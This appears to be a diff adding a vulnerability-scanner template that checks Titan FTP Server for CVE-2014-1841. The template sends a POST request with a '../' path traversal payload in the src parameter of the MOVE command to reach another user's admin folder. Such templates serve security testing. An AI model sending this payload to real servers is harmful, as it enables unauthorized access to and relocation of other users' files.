@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "检测Titan FTP Server Web接口Move功能中的目录遍历漏洞，攻击者可通过src参数中的../路径遍历复制其他用户的完整主文件夹"
+id = "POC-AVE-2014-0005"
+name = "CVE-2014-1841 Titan FTP Server Move函数目录遍历PoC"
+severity = "medium"
+tags = ["ave-2014-0005"]
+vuln_id = [
+    "CVE-2014-1841",
+    "AVE-2014-0005",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/titanftp.exe"
+protocol = "http"
+
+[poc.requests.body]
+content = "Command=MOVE&src=/../admin/&dst=/test_dir"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "200",
+    "error",
+    "denied",
+]
